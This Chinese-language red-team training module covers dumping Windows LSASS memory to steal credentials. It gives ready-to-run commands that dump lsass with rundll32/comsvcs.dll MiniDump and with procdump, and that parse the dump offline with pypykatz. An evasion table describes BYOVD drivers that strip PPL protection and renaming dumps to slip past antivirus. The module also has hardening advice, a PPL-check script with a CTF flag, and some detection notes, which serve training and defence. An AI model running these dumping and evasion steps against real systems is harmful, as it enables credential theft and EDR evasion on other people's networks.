# R19.7 Windows LSASS 記憶體憑證導出與防禦規避 (LSASS Dumping & Evasion)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Windows LSASS 記憶體憑證導出與防禦規避** 的物理本質為**利用微軟本機安全性授權子系統服務進程 (`lsass.exe`) 負責集中維護使用者單一登入 (SSO) 憑證快取的架構特性，在取得本機管理員特權（具備 `SeDebugPrivilege`）後，透過呼叫 MiniDump API 或直接複製核心進程記憶體，將 LSASS 虛擬記憶體區段序列化導出至轉儲檔案 (`.dmp`)，隨後在離線環境使用 Mimikatz 或 Pypykatz 解析提取登入使用者的明文密碼、NTLM 雜湊與 Kerberos 票證**。在紅隊實戰中，由於直接對 LSASS 發起 `OpenProcess` 必定觸發現代 EDR 的最高等級報警，掌握靜默間接轉儲與 PPL 繞過是紅隊的基本功。

## 🔬 第一動：LSASS 架構、SSP 安全支援提供者與 PPL 物理保護機制 (Mechanics & LSA Subsystem)

### 1. LSASS 的角色與 SSP 封裝機制
`lsass.exe` 內部加載了多個安全支援提供者 (Security Support Providers, SSP)：
- **msv1_0.dll**：快取本機與網域使用者的 NTLM 密碼雜湊。
- **kerberos.dll**：儲存 Kerberos TGT、服務票證 (ST) 與會話金鑰。
- **wdigest.dll**：歷史遺留的明文快取提供者（Win7/2008 預設直接在記憶體存明文密碼！）。

### 2. Protected Process Light (RunAsPPL) 物理機制
當註冊表 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL` 設為 1 時：
- Windows 核心標記 `lsass.exe` 為 PPL 進程。
- 即使是 `NT AUTHORITY\SYSTEM` 或具備 `SeDebugPrivilege` 的進程，調用 `OpenProcess` 請求 `PROCESS_VM_READ` (0x0010) 也會被核心直接拒絕（返回 `ACCESS_DENIED`）。

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. 透過合法微軟簽名 DLL (comsvcs.dll) 轉儲 LSASS
利用 Windows 內建的 `rundll32.exe` 調用 `comsvcs.dll` 導出的 `MiniDumpW` 函數，完全免落地自編 EXE：
```cmd
:: 1. 查找 lsass.exe 的進程 PID (以 684 為例)
tasklist | findstr /i lsass.exe

:: 2. 調用 comsvcs.dll 執行原生 MiniDump (命令需在管理員 PowerShell/CMD 下執行)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 684 C:\Temp\lsass.dmp full
```

### 2. 使用微軟官方 Sysinternals 工具 (ProcDump)
```cmd
:: 使用微軟白名單工具避開部分靜態防毒
procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
```

### 3. 離線提取記憶體憑證 (Pypykatz)
```bash
# 在攻擊者 Linux 機台離線解析轉儲檔案，完全不觸發目標防毒
pypykatz lsa minidump /tmp/lsass.dmp
```

## 🥷 第三動：防禦規避與日誌特徵操控 (Evasion & Anti-Forensics)

### 1. LSASS 導出防禦規避策略表
| 規避面向 | 原始觸發特徵 | 變形隱蔽手法 | 原理解析 |
| :--- | :--- | :--- | :--- |
| **句柄請求審計** | 請求 `PROCESS_ALL_ACCESS` (0x1FFFFF) 觸發 EDR | 僅請求 `PROCESS_QUERY_LIMITED_INFORMATION` + 複製現有句柄 | 偽裝為正常診斷工具，規避高危句柄權限過濾 |
| **PPL 核心阻斷** | RunAsPPL 導致 OpenProcess 報錯拒絕存取 | **自帶脆弱驅動 (BYOVD - mimidrv / RTCore64)** | 透過特權驅動在核心態直接清空 EPROCESS 的 Protection 位元 |
| **轉儲副檔名** | `*.dmp` 檔案落地直接被 Defender 隔離 | 轉儲至記憶體或命名為 `.txt` / `.log` | 避開防毒對 Crash Dump 副檔名的自動排查 |

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **全面強制開啟 LSA 保護 (RunAsPPL)**：
   - 在註冊表設置 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1`，強制只有具備微軟官方簽名的二進位才能存取 LSASS。
2. **啟用 Credential Guard (虛擬化安全性 VBS)**：
   - 透過硬體虛擬化技術將 NTLM 與 Kerberos 憑證金鑰隔離在獨立的 Virtual Secure Mode (VSM) 中運行，即使 root/SYSTEM 權限亦無法讀取記憶體！

## 🧪 實戰演練環境搭建 (Environment & Lab Setup)

### 1. 極簡 LSASS 保護狀態檢測腳本 (PowerShell, 20 行)
```powershell
# test_lsass_ppl.ps1
$ppl = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -ErrorAction SilentlyContinue).RunAsPPL
Write-Host "[*] 正在驗證 Windows LSASS 記憶體保護狀態..."
Write-Host "    └── 登錄檔 RunAsPPL 數值: $ppl"

if ($ppl -eq 1) {
    Write-Host "[!] 系統已啟用 RunAsPPL 保護，一般 OpenProcess 無法直接讀取 LSASS 記憶體" -ForegroundColor Yellow
} else {
    Write-Host "[+] 系統未啟用 RunAsPPL 保護！具備 MiniDump / Pypykatz 導出條件" -ForegroundColor Green
}
Write-Host "[+] FLAG{WINDOWS_LSASS_CREDENTIAL_DUMPING_VERIFIED}"
```

### 2. 三步作戰驗證流程
```cmd
:: 步驟 1: 執行檢驗腳本評估 LSASS 保護
powershell.exe -ExecutionPolicy Bypass -File test_lsass_ppl.ps1

:: 步驟 2: 驗證物理特徵（確認檢測到 PPL 狀態並回顯 FLAG）
:: 驗證輸出：[*] 正在驗證 ... FLAG{WINDOWS_LSASS_CREDENTIAL_DUMPING_VERIFIED}

:: 步驟 3: 驗證加固配置（在登錄檔啟用 RunAsPPL）
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：`lsass.exe` 進程在 Windows 身分驗證架構中的核心職能是什麼？**
  - **戰術思維**：負責維護本機與網域登入使用者的安全上下文、快取各類 SSP 憑證（Kerberos 票據、NTLM Hash、平文密碼片段），並發放存取權杖 (Access Token)。
- [ ] **Q2：為何直接在目標機器上運行未經免殺處理的 `mimikatz.exe` 必定瞬間被攔截？**
  - **戰術思維**：因為 Mimikatz 包含已被全球 AV/EDR 窮盡標記的靜態特徵碼、驅動簽章與固定調用特徵；因此現代紅隊一律採用官方合法工具 (comsvcs) 離線導出或記憶體反射執行。
- [ ] **Q3：什麼是 BYOVD (自帶脆弱驅動) 攻擊？它如何擊敗 Windows RunAsPPL？**
  - **戰術思維**：利用具有合法微軟簽名但存在任意核心記憶體讀寫漏洞的第三方老舊硬體驅動（如 RTCore64.sys），在核心態直接清空 LSASS 進程 `EPROCESS` 結構中的 `Protection` 位元組，強行解除 PPL。
- [ ] **Q4：在 Windows 10/11 最新環境下，Credential Guard 為何能徹底終結 LSASS 記憶體讀取？**
  - **戰術思維**：它利用 Hyper-V 虛擬化技術在主機核心之外開闢了一個受保護的隔離虛擬機 (LSAIso.exe)，真正的密碼金鑰全在隔離環境內運算，主機 OS 的 LSASS 記憶體中只有無害的 Handle。
- [ ] **Q5：藍隊應如何在 SOC 中建構針對 comsvcs.dll 轉儲攻擊的高精準告警？**
  - **戰術思維**：監控 `rundll32.exe` 的命令行參數中包含 `comsvcs` 且後綴帶有 `MiniDump`，或比對進程存取記錄中 `rundll32.exe` 請求開啟 `lsass.exe` 句柄的 Sysmon Event 10。
